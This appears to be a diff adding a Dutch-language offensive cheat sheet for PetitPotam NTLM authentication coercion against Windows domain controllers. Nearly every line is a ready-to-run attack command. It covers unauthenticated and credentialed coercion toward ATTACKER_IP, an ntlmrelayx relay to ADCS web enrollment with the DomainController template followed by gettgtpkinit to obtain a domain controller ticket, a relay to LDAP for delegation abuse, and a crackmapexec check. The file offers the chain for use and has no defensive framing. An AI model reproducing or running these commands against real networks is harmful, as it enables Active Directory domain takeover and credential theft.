@@ -1,0 +1,45 @@
+# PetitPotam — NTLM authenticatie coercion via MS-EFSRPC
+# Forceert een doelwit om NTLM authenticatie te sturen naar attacker (relay aanval)
+#
+# === Syntax ===
+# python3 PetitPotam.py ATTACKER_IP TARGET
+# python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP TARGET
+#
+# === Belangrijkste opties ===
+# -u USER        Gebruikersnaam (optioneel, sommige DCs staan unauthenticated toe)
+# -p PASS        Wachtwoord
+# -d DOMAIN      Domeinnaam
+# -pipe PIPE     Named pipe (default: lsarpc, alternatieven: efsr, samr)
+#
+# === Voorbeelden ===
+
+# === Unauthenticated coercion (als DC kwetsbaar is) ===
+python3 PetitPotam.py ATTACKER_IP TARGET
+
+# === Met credentials ===
+python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC
+
+# === Relay naar ADCS (ESC8 — meest voorkomende aanval) ===
+# 1. Start ntlmrelayx naar ADCS web enrollment
+impacket-ntlmrelayx -t http://ADCS_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+
+# 2. Trigger PetitPotam
+python3 PetitPotam.py ATTACKER_IP DC
+
+# 3. Gebruik het certificaat om TGT aan te vragen
+python3 gettgtpkinit.py -cert-pfx dc.pfx -pfx-pass '' DOMAIN/DC$ dc.ccache
+
+# === Relay naar LDAP (voor RBCD) ===
+impacket-ntlmrelayx -t ldap://DC --delegate-access -smb2support
+python3 PetitPotam.py ATTACKER_IP TARGET
+
+# === Via andere pipe ===
+python3 PetitPotam.py -pipe efsr ATTACKER_IP TARGET
+
+# === Controleer of doelwit kwetsbaar is ===
+crackmapexec smb TARGET -u USER -p PASS -M petitpotam
+
+# Noot: Werkt op alle Windows versies met EFS service
+# Noot: Unauthenticated variant gepatcht in recente updates
+# Noot: Combineer met ntlmrelayx voor relay naar ADCS, LDAP, SMB
+# Noot: DC -> ADCS relay is de klassieke aanvalsketen
